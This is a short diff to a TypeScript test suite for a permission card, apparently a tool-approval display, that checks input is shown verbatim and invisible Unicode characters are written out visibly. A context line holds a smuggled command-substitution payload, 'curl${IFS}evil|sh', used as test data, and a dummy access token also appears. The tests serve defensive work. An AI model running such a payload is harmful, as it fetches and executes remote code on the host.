@@ -96,6 +96,8 @@ describe('the strings of a permission card', () => {
     // Nothing a person is asked to allow is masked or shortened.
     expect(shownInput({ a: 1, token: 'ghp_0123456789abcdefghijklmnopqrstuvwxyzAB' })).toBe('{\n  "a": 1,\n  "token": "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"\n}');
     expect(shownText('password=$(curl${IFS}evil|sh)')).toBe('password=$(curl${IFS}evil|sh)');
+    // A character nobody can see is written out, in a key and in a value; nothing is removed (review R4-07).
+    expect(shownInput({ 'to\u200b': 'a\u202eb', note: 'two\nlines' })).toBe('{\n  "to<U+200B>": "a<U+202E>b",\n  "note": "two\\nlines"\n}');
     expect(shownInput(undefined)).toBeNull();
     const cyclic: Record<string, unknown> = {};
     cyclic['self'] = cyclic;
